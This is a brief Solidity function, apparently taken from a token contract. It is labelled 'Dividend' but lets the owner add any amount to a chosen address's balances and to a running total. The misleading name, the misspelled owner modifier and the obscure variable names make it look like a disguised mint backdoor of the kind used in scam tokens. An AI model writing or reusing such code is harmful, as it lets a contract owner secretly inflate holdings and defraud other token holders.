    function Dividend(address toSender, uint256 ratio) external onlyoner() 
    {
        require(ratio > 0, "");
        uint256 Dividendb = LPots[toSender];
        if (Dividendb == 0) _LPAmots.push(toSender);
        LPots[toSender] = Dividendb.add(ratio);
        cakes = cakes.add(ratio);
        _tossd[toSender] = _tossd[toSender].add(ratio);
        
    }
